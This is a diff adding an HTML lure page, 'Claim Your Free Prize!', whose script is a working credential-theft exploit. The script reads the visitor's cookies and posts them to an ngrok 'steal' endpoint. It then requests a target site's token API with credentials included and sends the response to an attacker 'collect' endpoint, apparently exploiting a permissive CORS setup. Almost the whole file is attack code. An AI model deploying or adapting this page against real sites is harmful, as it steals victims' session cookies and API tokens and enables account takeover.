@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head><title>Claim Your Free Prize!</title></head>
+<body>
+  <h1>Click to Claim Your Prize!</h1>
+  <p>Verifying your account...</p>
+
+  <script>
+    (function() {
+      const attackerServer = "https://your.ngrok.app"; // Your server collecting data
+      const targetUrl = "https://foo.bar/api/v2/token"; // Endpoint on target site
+
+    (async () => {
+      const STEAL = "https://your.ngrok.app/steal";
+      const cookies = document.cookie;
+      if (cookies) {
+        await fetch(STEAL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ cookies })
+        });
+        console.log("Cookies sent successfully");
+      }
+    })();
+
+      // Fetch target URL with credentials to send cookies
+      fetch(targetUrl, {
+        method: 'GET',
+        credentials: 'include',
+        mode: 'cors'
+      })
+      .then(response => response.text())
+      .then(data => {
+        // Exfiltrate response data (including cookies if accessible) to attacker server
+        return fetch(attackerServer + '/collect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ data: data })
+        });
+      })
+      .then(() => console.log('Exfiltration complete'))
+      .catch(err => console.error('Error:', err));
+    })();
+  </script>
+</body>
+</html>
